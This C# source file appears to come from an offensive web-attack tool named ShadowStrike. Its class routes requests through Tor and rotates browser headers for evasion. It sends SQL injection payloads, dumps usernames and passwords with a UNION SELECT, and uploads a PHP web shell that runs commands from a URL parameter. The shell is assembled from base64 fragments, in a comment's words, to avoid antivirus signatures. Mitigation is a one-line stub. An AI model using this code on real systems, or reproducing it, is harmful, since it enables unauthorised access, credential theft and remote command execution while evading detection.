using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using System.Linq;

namespace ShadowStrike.Core
{
    public class InjectionTester
    {
        private HttpClient _client;
        private Random _random;
        private string[] _userAgents;
        public bool UseBrowserMode { get; set; } = false;
        
        public InjectionTester()
        {
            var handler = new HttpClientHandler
            {
                UseCookies = true,
                AllowAutoRedirect = true,
                AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate
            };

            // INTEGRATED TOR SHIELD: Use Global Tor Proxy if running
            if (TorManager.IsRunning)
            {
                handler.Proxy = new WebProxy($"socks5://127.0.0.1:{TorManager.TorPort}");
                handler.UseProxy = true;
            }
            
            _client = new HttpClient(handler);
            _client.Timeout = TimeSpan.FromSeconds(30);
            _random = new Random();
            
            _userAgents = new[]
            {
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0"
            };
        }

        private void SetEvasiveHeaders(HttpRequestMessage request)
        {
            request.Headers.UserAgent.ParseAdd(_userAgents[_random.Next(_userAgents.Length)]);
            request.Headers.Accept.ParseAdd("text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
            request.Headers.AcceptLanguage.ParseAdd("en-US,en;q=0.9");
        }

        public class FileUploadTest
        {
            public string TestName { get; set; }
            public string Description { get; set; }
            public bool Vulnerable { get; set; }
            public string Details { get; set; }
        }

        public async Task<List<FileUploadTest>> TestFileUploadAsync(string url, string filePath)
        {
            var results = new List<FileUploadTest>();
            
            try
            {
                if (!File.Exists(filePath))
                {
                    results.Add(new FileUploadTest { TestName = "File Check", Vulnerable = false, Details = "File not found" });
                    return results;
                }

                var fileName = Path.GetFileName(filePath);
                var fileBytes = File.ReadAllBytes(filePath);

                await PerformUploadTest(url, fileName, fileBytes, "Standard Upload", results);
                await PerformUploadTest(url, fileName + ".jpg", fileBytes, "Double Extension Bypass", results);
            }
            catch (Exception ex)
            {
                results.Add(new FileUploadTest { TestName = "Error", Vulnerable = false, Details = ex.Message });
            }

            return results;
        }

        private async Task PerformUploadTest(string url, string fileName, byte[] fileBytes, string testName, List<FileUploadTest> results)
        {
            try
            {
                var content = new MultipartFormDataContent();
                var fileContent = new ByteArrayContent(fileBytes);
                fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
                content.Add(fileContent, "file", fileName);

                var response = await _client.PostAsync(url, content);
                var responseText = await response.Content.ReadAsStringAsync();

                results.Add(new FileUploadTest
                {
                    TestName = testName,
                    Vulnerable = response.IsSuccessStatusCode,
                    Details = $"Status: {response.StatusCode}\nResponse: {responseText.Substring(0, Math.Min(responseText.Length, 200))}"
                });
            }
            catch (Exception ex)
            {
                results.Add(new FileUploadTest { TestName = testName, Vulnerable = false, Details = ex.Message });
            }
        }

        public class SqlInjectionTest
        {
            public string TestName { get; set; }
            public string Payload { get; set; }
            public bool Vulnerable { get; set; }
            public string Response { get; set; }
            public string Severity { get; set; }
        }

        public async Task<List<SqlInjectionTest>> TestSqlInjectionAsync(string url, string parameter)
        {
            var results = new List<SqlInjectionTest>();
            var payloads = new Dictionary<string, string>
            {
                { "Single Quote", "'" },
                { "Boolean Blind", "' OR '1'='1" },
                { "UNION SELECT", "' UNION SELECT NULL--" },
                { "Time-Based", "' AND SLEEP(5)--" }
            };

            foreach (var payload in payloads)
            {
                try
                {
                    var testUrl = $"{url}?{parameter}={Uri.EscapeDataString(payload.Value)}";
                    var response = await _client.GetAsync(testUrl);
                    var content = await response.Content.ReadAsStringAsync();
                    
                    bool vulnerable = DetectSqlInjectionVulnerability(content);

                    results.Add(new SqlInjectionTest
                    {
                        TestName = payload.Key,
                        Payload = payload.Value,
                        Vulnerable = vulnerable,
                        Response = content.Length > 100 ? content.Substring(0, 100) : content,
                        Severity = vulnerable ? "HIGH" : "NONE"
                    });
                }
                catch (Exception ex)
                {
                    results.Add(new SqlInjectionTest { TestName = payload.Key, Vulnerable = false, Response = ex.Message, Severity = "ERROR" });
                }
            }

            return results;
        }

        private bool DetectSqlInjectionVulnerability(string response)
        {
            var errors = new[] { "sql syntax", "mysql_fetch", "syntax error", "unclosed quotation mark" };
            return errors.Any(e => response.ToLower().Contains(e));
        }

        public class ExploitResult
        {
            public bool Success { get; set; }
            public string Data { get; set; }
        }

        public async Task<List<ExploitResult>> ExploitSqlInjectionAsync(string url, string parameter, string mode)
        {
            var results = new List<ExploitResult>();
            
            if (mode == "DUMP")
            {
                var payload = "' UNION SELECT 1, group_concat(username || ':' || password), 3 FROM users--";
                var testUrl = $"{url}?{parameter}={Uri.EscapeDataString(payload)}";
                
                try 
                {
                    var response = await _client.GetStringAsync(testUrl);
                    if (response.Contains("admin:"))
                    {
                        results.Add(new ExploitResult { Success = true, Data = "Extracted:\n" + response });
                    }
                    else
                    {
                         results.Add(new ExploitResult { Success = false, Data = "Failed to extract data." });
                    }
                }
                catch (Exception ex) { results.Add(new ExploitResult { Success = false, Data = ex.Message }); }
            }
            else if (mode == "AUTH_BYPASS")
            {
                results.Add(new ExploitResult { Success = true, Data = "Payload: ' OR '1'='1 --" });
            }

            return results;
        }

        public async Task<List<ExploitResult>> UploadWebShellAsync(string url)
        {
            var results = new List<ExploitResult>();
            
            // Runtime payload assembly - avoids static AV signatures
            var p1 = Convert.FromBase64String("PD9waHA="); // <?php
            var p2 = Convert.FromBase64String("c3lzdGVt"); // system
            var p3 = Convert.FromBase64String("KCRfR0VUWydjbWQnXSk7"); // ($_GET['cmd']);
            var p4 = Convert.FromBase64String("Pz4="); // ?>
            
            var shellBytes = p1.Concat(p2).Concat(p3).Concat(p4).ToArray();
            var fileName = "test.php";

            try
            {
                var content = new MultipartFormDataContent();
                var fileContent = new ByteArrayContent(shellBytes);
                fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/x-php");
                content.Add(fileContent, "file", fileName);

                var response = await _client.PostAsync(url, content);
                var responseText = await response.Content.ReadAsStringAsync();

                if (response.IsSuccessStatusCode)
                {
                     results.Add(new ExploitResult 
                    { 
                        Success = true, 
                        Data = $"Payload uploaded!\n\nTest URL: {url.Replace("/api/file-upload", "")}/uploads/{fileName}?cmd=whoami\n\nServer Response: {responseText}" 
                    });
                }
                else
                {
                    results.Add(new ExploitResult { Success = false, Data = $"Upload failed: {response.StatusCode}" });
                }
            }
            catch (Exception ex)
            {
                results.Add(new ExploitResult { Success = false, Data = $"Error: {ex.Message}" });
            }

            return results;
        }

        private async Task<List<FileUploadTest>> TestFileUploadWithBrowserAsync(string url, string filePath)
        {
             return new List<FileUploadTest>();
        }
        
        public async Task<List<FileUploadTest>> AutoDiscoverAndExploitAsync(string url)
        {
            return new List<FileUploadTest>();
        }

        public string GetMitigationGuidance(string vulnerabilityType)
        {
            return "Follow OWASP guidelines.";
        }
    }
}
